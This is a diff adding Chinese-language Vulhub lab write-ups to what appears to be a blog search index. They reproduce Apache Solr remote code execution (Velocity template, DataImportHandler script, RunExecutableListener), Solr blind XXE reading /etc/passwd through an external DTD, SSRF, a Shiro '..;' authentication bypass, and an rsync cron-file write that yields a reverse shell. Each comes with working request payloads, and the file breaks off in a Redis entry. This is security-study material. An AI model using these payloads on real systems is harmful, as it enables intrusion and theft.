@@ -17,6 +17,337 @@
       </tags>
   </entry>
   <entry>
+    <title>通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)</title>
+    <url>/2022/01/12/%E9%80%9A%E8%BF%87%20Velocity%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E6%9D%BF%E6%89%A7%E8%A1%8C%20Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%20(CVE-2019-17558)/</url>
+    <content><![CDATA[<h1 id="通过-Velocity-自定义模板执行-Apache-Solr-远程代码-CVE-2019-17558"><a href="#通过-Velocity-自定义模板执行-Apache-Solr-远程代码-CVE-2019-17558" class="headerlink" title="通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)"></a>通过 Velocity 自定义模板执行 Apache Solr 远程代码 (CVE-2019-17558)</h1><p>Solr 是流行的、速度极快的开源企业搜索平台，它建立在 Apache Lucene(TM) 之上。</p>
+<p>Apache Solr 5.0.0 到 Apache Solr 8.3.1 容易受到通过 VelocityResponseWriter 的远程代码执行的攻击。可以通过 configset<code>velocity/</code>目录中的Velocity 模板或作为参数提供 Velocity 模板。用户定义的配置集可能包含可渲染的、潜在的恶意模板。默认情况下禁用参数提供的模板，但可以<code>params.resource.loader.enabled</code>通过定义一个设置为 的响应编写器来启用<code>true</code>。定义响应编写器需要配置 API 访问权限。Solr 8.4 完全移除了 params 资源加载器，并且仅在 configset 为<code>trusted</code>（已由经过身份验证的用户上传）时启用 configset 提供的模板渲染。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17558" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2019-17558</a></li>
+<li><a href="https://issues.apache.org/jira/browse/SOLR-13971" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SOLR-13971</a></li>
+<li><a href="https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133" target="_blank" rel="noopener">https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133</a></li>
+<li><a href="https://github.com/jas502n/solr_rce" target="_blank" rel="noopener">https://github.com/jas502n/solr_rce</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先，需要通过以下 API 获取所有核心名称：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure>
+
+<p>这<code>demo</code>是这里唯一的核心：</p>
+<p><img src="https://image.3001.net/images/20220112/16419802957813.png" alt="image-20220112144918121"></p>
+<p><code>params.resource.loader.enabled</code>通过以下 API启用配置，API 端点是<code>/solr/[core name]/config</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220112/16419802974165.png" alt="image-20220112145025026"></p>
+<p>然后，通过 Velocity 模板触发漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220112/16419803021587.png" alt="image-20220112145227088"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache solr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Solr RemoteStreaming 任意文件读取和 SSRF</title>
+    <url>/2022/01/12/Apache%20Solr%20RemoteStreaming%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%20SSRF/</url>
+    <content><![CDATA[<h1 id="Apache-Solr-RemoteStreaming-任意文件读取和-SSRF"><a href="#Apache-Solr-RemoteStreaming-任意文件读取和-SSRF" class="headerlink" title="Apache Solr RemoteStreaming 任意文件读取和 SSRF"></a>Apache Solr RemoteStreaming 任意文件读取和 SSRF</h1><p>Apache Solr 是一个开源搜索服务器。当 Apache Solr 不启用身份验证时，攻击者可以直接制造请求以启用特定配置，最终导致 SSRF 或任意文件读取。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，浏览器<code>http://192.168.44.132:8983</code>查看Apache Solr。</p>
+<p>首先，访问<code>http://192.168.44.132:8983/solr/admin/cores?indexInfo=false&amp;wt=json</code>提取数据库名称：</p>
+<p>![image-20220112151942073](Apache Solr RemoteStreaming 任意文件读取和 SSRF/image-20220112151942073.png)</p>
+<p>发送如下请求，修改数据库配置<code>demo</code>启用<code>RemoteStreaming</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -s -k -X $&#39;POST&#39; \</span><br><span class="line">     -H $&#39;Content-Type: application&#x2F;json&#39; --data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#39; \</span><br><span class="line">     $&#39;http:&#x2F;&#x2F;192.168.44.132:8983&#x2F;solr&#x2F;demo&#x2F;config&#39;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220112152051635](Apache Solr RemoteStreaming 任意文件读取和 SSRF/image-20220112152051635.png)</p>
+<p>然后通过<code>stream.url</code>以下方式读取任意文件：</p>
+<p>![image-20220112152404255](Apache Solr RemoteStreaming 任意文件读取和 SSRF/image-20220112152404255.png)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Apache Solr 远程命令执行漏洞（CVE-2019-0193）</title>
+    <url>/2022/01/12/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0193%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Apache-Solr-远程命令执行漏洞（CVE-2019-0193）"><a href="#Apache-Solr-远程命令执行漏洞（CVE-2019-0193）" class="headerlink" title="Apache Solr 远程命令执行漏洞（CVE-2019-0193）"></a>Apache Solr 远程命令执行漏洞（CVE-2019-0193）</h1><p>漏洞原理与分析可以参考：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA</a></li>
+<li><a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a></li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
+<p>本环境测试RCE漏洞。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>命令执行成功后，需要等待一会，之后访问<code>http://192.168.44.132:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<p><img src="https://image.3001.net/images/20220112/16419802308272.png" alt="image-20220112141648886"></p>
+<p>如上图所示，首先打开刚刚创建好的<code>test</code>核心，选择Dataimport功能并选择debug模式，填入以下POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">            url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">            processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">            transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>点击<code>Execute with this Confuguration</code>会发送以下请求包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;dataimport?_&#x3D;1565835261600&amp;indent&#x3D;on&amp;wt&#x3D;json HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8983</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 679</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;</span><br><span class="line">Cookie: csrftoken&#x3D;gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid&#x3D;snzojzqa5zn187oghf06z6xodulpohpr</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;test&amp;dataConfig&#x3D;%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name&#x3D;dataimport</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>docker-compose exec solr ls /tmp</code>，可见<code>/tmp/success</code>已成功创建：</p>
+<p><img src="https://image.3001.net/images/20220112/16419802356600.png" alt="image-20220112142642036"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache solr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Solr 远程命令执行漏洞（CVE-2017-12629）</title>
+    <url>/2022/01/12/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Apache-Solr-远程命令执行漏洞（CVE-2017-12629）"><a href="#Apache-Solr-远程命令执行漏洞（CVE-2017-12629）" class="headerlink" title="Apache Solr 远程命令执行漏洞（CVE-2017-12629）"></a>Apache Solr 远程命令执行漏洞（CVE-2017-12629）</h1><p>漏洞原理与分析可以参考：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/43009/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43009/</a></li>
+<li><a href="https://paper.seebug.org/425/" target="_blank" rel="noopener">https://paper.seebug.org/425/</a></li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：<a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE" target="_blank" rel="noopener">XML实体扩展漏洞（XXE）</a>和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。</p>
+<p>本环境测试RCE漏洞。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<p>首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8983</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch &#x2F;tmp&#x2F;success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220112/16419795842512.png" alt="image-20220112134314573"></p>
+<p>然后进行update操作，触发刚才添加的listener：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;update HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8983</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220112/16419795877177.png" alt="image-20220112134722074"></p>
+<p>执行<code>docker-compose exec solr bash</code>进入容器，可见<code>/tmp/success</code>已成功创建：</p>
+<p><img src="https://image.3001.net/images/20220112/16419795906677.png" alt="image-20220112134801628"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache solr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache solr XML 实体注入漏洞（CVE-2017-12629）</title>
+    <url>/2022/01/12/Apache%20solr%20XML%20%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Apache-solr-XML-实体注入漏洞（CVE-2017-12629）"><a href="#Apache-solr-XML-实体注入漏洞（CVE-2017-12629）" class="headerlink" title="Apache solr XML 实体注入漏洞（CVE-2017-12629）"></a>Apache solr XML 实体注入漏洞（CVE-2017-12629）</h1><p>漏洞原理与分析可以参考：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/43009/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43009/</a></li>
+<li><a href="https://paper.seebug.org/425/" target="_blank" rel="noopener">https://paper.seebug.org/425/</a></li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。</p>
+<p>本环境仅测试XXE漏洞，RCE和利用链，可以在 <a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE</a> 中查看。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>命令执行成功后，需要等待一会，之后访问<code>http://192.168.44.132:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<p>由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）：</p>
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#39;:%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>保存为passwd.dtd，开启服务器，把passwd.dtd文件放到www目录下，构造请求包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;demo&#x2F;select?&amp;q&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % ext SYSTEM &quot;http:&#x2F;&#x2F;192.168.44.132&#x2F;passwd.dtd&quot;&gt;%ext;%ent;]&gt;&lt;r&gt;&amp;data;&lt;&#x2F;r&gt;&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>经过url编码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;demo&#x2F;select?&amp;q&#x3D;%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.44.132%2fpasswd.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>成功读取了/etc/passwd文件</p>
+<p><img src="https://image.3001.net/images/20220112/16419794851956.png" alt="image-20220112113015824"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache solr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Shiro 身份验证绕过漏洞 (CVE-2020-1957)</title>
+    <url>/2022/01/10/Apache%20Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2020-1957)/</url>
+    <content><![CDATA[<h1 id="Apache-Shiro-身份验证绕过漏洞-CVE-2020-1957"><a href="#Apache-Shiro-身份验证绕过漏洞-CVE-2020-1957" class="headerlink" title="Apache Shiro 身份验证绕过漏洞 (CVE-2020-1957)"></a>Apache Shiro 身份验证绕过漏洞 (CVE-2020-1957)</h1><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。</p>
+<p>在具有 Spring 动态控制器的 1.5.2 之前的 Apache Shiro 版本中，攻击者可以构造恶意请求<code>..;</code>以绕过目录身份验证。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139</a></li>
+<li><a href="https://xz.aliyun.com/t/8281" target="_blank" rel="noopener">https://xz.aliyun.com/t/8281</a></li>
+<li><a href="https://blog.spoock.com/2020/05/09/cve-2020-1957/" target="_blank" rel="noopener">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>查看主页。</p>
+<p>本应用中 URL 权限的配置如下。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title">shiroFilterChainDefinition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DefaultShiroFilterChainDefinition chainDefinition = <span class="keyword">new</span> DefaultShiroFilterChainDefinition();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">"/login.html"</span>, <span class="string">"authc"</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">"/logout"</span>, <span class="string">"logout"</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">"/admin/**"</span>, <span class="string">"authc"</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>/admin/</code>无法访问对管理页面的直接请求，并将被重定向到登录页面。</p>
+<p><img src="https://image.3001.net/images/20220110/16418004988959.png" alt="image-20220110152310825"></p>
+<p>构造一个恶意请求<code>/xxx/..;/admin/</code>以绕过身份验证检查并访问管理页面。</p>
+<p><img src="https://image.3001.net/images/20220110/16418005001640.png" alt="image-20220110152322385"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</title>
+    <url>/2022/01/10/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务启动后，访问<code>http://192.168.44.132:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
+<p>工具：<a href="https://github.com/feihong-cs/ShiroExploit/" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit/</a></p>
+<p><img src="https://image.3001.net/images/20220110/16418004588179.png" alt="image-20220110150705084"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rsync 未授权访问漏洞</title>
+    <url>/2022/01/10/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="rsync-未授权访问漏洞"><a href="#rsync-未授权访问漏洞" class="headerlink" title="rsync 未授权访问漏洞"></a>rsync 未授权访问漏洞</h1><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，我们用rsync命令访问之：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync rsync:&#x2F;&#x2F;192.168.44.132:873&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>可以查看模块名列表：</p>
+<p><img src="https://image.3001.net/images/20220110/16417930842370.png" alt="image-20220110100021757"></p>
+<p>如上图，有一个src模块，我们再列出这个模块下的文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync rsync:&#x2F;&#x2F;192.168.44.132:873&#x2F;src&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220110/16417930898043.png" alt="image-20220110100120570"></p>
+<p>这是一个Linux根目录，我们可以下载任意文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av rsync:&#x2F;&#x2F;192.168.44.132:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220110/16417930928226.png" alt="image-20220110100252690"></p>
+<p>或者写入任意文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av shell rsync:&#x2F;&#x2F;192.168.44.132:873&#x2F;src&#x2F;etc&#x2F;cron.d&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p>我们写入了一个cron任务，成功反弹shell：</p>
+<p><img src="https://image.3001.net/images/20220110/16417930949407.png" alt="image-20220110104818612"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>rsync</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis 4.x/5.x 未授权访问漏洞</title>
+    <url>/2022/01/01/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Redis-4-x-5-x-未授权访问漏洞"><a href="#Redis-4-x-5-x-未授权访问漏洞" class="headerlink" title="Redis 4.x/5.x 未授权访问漏洞"></a>Redis 4.x/5.x 未授权访问漏洞</h1><p>Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<a id="more"></a>
+
+<p>参考链接：</p>
+<ul>
+<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，通过<code>redis-cli -h 192.168.44.132</code>即可进行连接，可见存在未授权访问漏洞。</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>ping：</strong>检测是否连通 且 有权限执行命令</p>
